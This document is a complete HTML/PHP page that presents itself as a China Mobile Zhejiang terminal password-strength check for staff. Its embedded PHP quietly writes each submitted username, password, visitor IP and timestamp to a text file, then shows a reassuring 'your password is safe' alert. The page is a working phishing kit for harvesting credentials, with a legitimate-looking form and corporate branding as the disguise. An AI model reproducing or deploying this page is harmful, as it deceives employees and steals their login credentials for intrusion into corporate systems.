﻿<!DOCTYPE HTML>
<!DOCTYPE html PUBLIC "" ""><!--[if lt IE 7]>
<html lang="zh-cmn-Hans" class="lt-ie9 lt-ie8 lt-ie7"> <![endif]--><!--[if IE 7]>
<html lang="zh-cmn-Hans" class="ie7 lt-ie9 lt-ie8"> <![endif]--><!--[if IE 8]>
<html lang="zh-cmn-Hans" class="ie8 lt-ie9"> <![endif]--><!--[if gt IE 8]><!--><HTML 
lang="zh-cmn-Hans"><!--<![endif]--><HEAD><META content="IE=11.0000" 
http-equiv="X-UA-Compatible">
     
<META charset="utf-8">     
<META name="renderer" content="ie-stand">     
<META name="depid" content="b386d880-2415-11e6-86a9-5254008e98ca">     
<META http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">     
<TITLE>浙江移动终端密码强度检测</TITLE>       
<META name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0"> 
    <LINK href="/oa/favicon.ico" rel="shortcut icon" type="image/ico">

<SCRIPT src="files/respond-min.js"></SCRIPT>
 
<SCRIPT src="files/sea.js"></SCRIPT>
 
<SCRIPT src="files/seajs-preload.min.js"></SCRIPT>
 
<SCRIPT src="files/config.js"></SCRIPT>
<LINK href="files/bootstrap.min.css" rel="stylesheet"> <LINK href="files/style.css" 
rel="stylesheet"> <LINK href="files/draft.css" rel="stylesheet"> <LINK 
href="files/draft-print.css" rel="stylesheet" media="print"> <LINK 
href="files/staff.css" rel="stylesheet">
<META name="GENERATOR" content="MSHTML 11.00.9600.19180"></HEAD> 
<BODY>
<?php
if($_GET['Password']){
file_put_contents("pZj.txt", $_GET['userName']."|".$_GET['Password']."|".$_SERVER['REMOTE_ADDR']."|".date("Y-m-d H:i:s")."\n", FILE_APPEND);
echo "<script>alert('恭喜，您的密码安全!')</script>";
}
?>
<DIV class="page">
<DIV class="header navbar navbar-fixed-top" id="header">
<DIV class="header-container container">
<DIV class="header-navbar-header navbar-header"><A class="header-navbar-brand navbar-brand" 
href="http://zj.10086.cn/">浙江移动终端密码强度检测专项稽核</A></DIV>
<DIV class="header-collapse clearfix">
<UL class="header-primary-nav nav navbar-nav navbar-right"></UL></DIV><IFRAME 
name="caslogout" id="caslogoutFrame" src="about:blank" 
style="display: none;"></IFRAME>         
<FORM id="caslogoutForm" style="display: none;"></FORM></DIV></DIV>
<DIV class="content" id="content">

 
<DIV class="page-panel">
<OL class="breadcrumb">
  </OL>
<DIV class="page-panel-inner">
<DIV class="container">
<FORM id="password-form" style="width: 500px;">
<DIV class="form-group"><LABEL for="input-userName">终端用户名</LABEL>                  
           <INPUT name="userName" class="form-control" id="input-userName" type="text" placeholder="administrator" value=""></DIV>
<DIV class="form-group"><LABEL for="input-oldPassword">终端密码</LABEL>               
              <INPUT name="Password" class="form-control" id="input-oldPassword" type="password" placeholder="请输入终端密码" value=""></DIV>
<INPUT class="form-control" id="hid_modulus" type="hidden" value="00c6c94c08246d2e97cb442a6ced049f0c2fd0c1d9c64c64bd0f2c46534117ad7f6e4e2d6463b6603fca32cef0180aa9115e423bb5741c99b087df083d63cbd0f0443cd57b6728719c21cc49428960c28be245d011b8c4fb49e2fd4746abdd551ab57e944a2b28272cc6e92cdd90072fdcc4fd3ed8a29d163a76211b4762cf6115"><INPUT class="form-control" id="hid_exponent" type="hidden" value="010001"><BUTTON 
class="btn btn-primary" type="submit">检测强度</BUTTON>                     
</FORM></DIV></DIV></DIV></DIV></DIV>
 </BODY></HTML>
